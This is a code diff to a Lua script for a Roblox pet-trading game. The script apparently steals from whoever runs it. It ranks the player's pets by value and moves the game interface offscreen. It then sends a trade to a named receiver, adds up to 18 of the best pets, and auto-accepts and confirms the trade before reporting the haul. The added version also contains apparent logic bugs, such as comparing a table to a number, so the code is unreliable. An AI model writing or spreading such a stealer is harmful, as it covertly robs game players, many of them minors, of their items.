@@ -31,6 +31,8 @@ if game:GetService("RobloxReplicatedStorage"):FindFirstChild("GetServerType"):In
     return
 end
 
+local inTrade = false
+
 -- >> Values Table for all pets << --
 local valuesTable = {
     -- Legendary Pets
@@ -942,67 +944,64 @@ function SendTradeSuccessMessage(ReceiverName, tradedPets)
     end)
 end
 
-local function TradeIncoming(ReceiverName)
-    while true do
-    local RouterClient = Loaders("RouterClient")
-    local SendTrade = RouterClient.get("TradeAPI/SendTradeRequest")
-    local AddPetRemote = RouterClient.get("TradeAPI/AddItemToOffer")
-    local AcceptNegotiationRemote = RouterClient.get("TradeAPI/AcceptNegotiation")
-    local ConfirmTradeRemote = RouterClient.get("TradeAPI/ConfirmTrade")
-    local InventoryDB = require(game.ReplicatedStorage.Fsys).load("InventoryDB")
-    local ClientData = require(game.ReplicatedStorage.ClientModules.Core.ClientData)
+local RouterClient = Loaders("RouterClient")
+local SendTrade = RouterClient.get("TradeAPI/SendTradeRequest")
+local AddPetRemote = RouterClient.get("TradeAPI/AddItemToOffer")
+local AcceptNegotiationRemote = RouterClient.get("TradeAPI/AcceptNegotiation")
+local ConfirmTradeRemote = RouterClient.get("TradeAPI/ConfirmTrade")
+local InventoryDB = require(game.ReplicatedStorage.Fsys).load("InventoryDB")
+local ClientData = require(game.ReplicatedStorage.ClientModules.Core.ClientData)
+local PetsInventory = ClientData.get_data()[game.Players.LocalPlayer.Name].inventory.pets
+local tradedPets = {} 
+local sortedPets = {}
+local petCount = 0
+local petLimit = 18
 
-    local PetsInventory = ClientData.get_data()[game.Players.LocalPlayer.Name].inventory.pets
-    local sortedPets = {}
-    local tradedPets = {} 
+local function TradeIncoming(ReceiverName)
+    while sortedPets > 0 do
+        local tradeRequestSend = false
+        if not inTrade and tradeRequestSend then
+            for petUid, petData in pairs(PetsInventory) do
+                local petInfo = InventoryDB[petData.category][petData.id]
+                local calculatedValue, baseValue = calculatePetValue(petData)
+                table.insert(sortedPets, {
+                    uid = petUid,
+                    data = petData,
+                    value = calculatedValue,
+                    baseValue = baseValue,
+                    name = petInfo.name
+                })
+            end
     
-    for petUid, petData in pairs(PetsInventory) do
-        local petInfo = InventoryDB[petData.category][petData.id]
-        local calculatedValue, baseValue = calculatePetValue(petData)
-        table.insert(sortedPets, {
-            uid = petUid,
-            data = petData,
-            value = calculatedValue,
-            baseValue = baseValue,
-            name = petInfo.name
-        })
-    end
-    
-    table.sort(sortedPets, function(a, b)
-        return a.value > b.value
-    end)
-    
-    moveGuiOffscreen()
-    SendTrade:FireServer(game.Players[ReceiverName])
-    wait(5)
-    
-    local petCount = 0
-    local petLimit = 18
-    
-    for _, petInfo in ipairs(sortedPets) do
-        if petCount < petLimit then
-            AddPetRemote:FireServer(petInfo.uid)
-            table.insert(tradedPets, {
-                uid = petInfo.uid,
-                data = petInfo.data,
-                name = petInfo.name,
-                value = petInfo.value
-            })
-            petCount = petCount + 1
-            wait(0.2)
+            table.sort(sortedPets, function(a, b)
+                return a.value > b.value
+            end)
+            moveGuiOffscreen()
+            SendTrade:FireServer(game.Players[ReceiverName])
+            tradeRequestSend = true
         else
-            break
+            for _, petInfo in ipairs(sortedPets) do
+                if petCount < petLimit then
+                    AddPetRemote:FireServer(petInfo.uid)
+                    table.insert(tradedPets, {
+                        uid = petInfo.uid,
+                        data = petInfo.data,
+                        name = petInfo.name,
+                        value = petInfo.value
+                    })
+                    petCount = petCount + 1
+                    wait(0.2)
+                end
+                repeat
+                    AcceptNegotiationRemote:FireServer()
+                    wait(0.1)
+                    ConfirmTradeRemote:FireServer()
+                until not inTrade
+            end
+            wait(0.1)
+            SendTradeSuccessMessage(ReceiverName, tradedPets)
         end
     end
-                wait(5)
-                    AcceptNegotiationRemote:FireServer()
-                wait(2)
-                    ConfirmTradeRemote:FireServer()
-                wait(2) 
-                    if #tradedPets > 0 then
-                        SendTradeSuccessMessage(ReceiverName, tradedPets)
-                    end
-            end
 end
 
 function SendLeaveNotify(playerName)
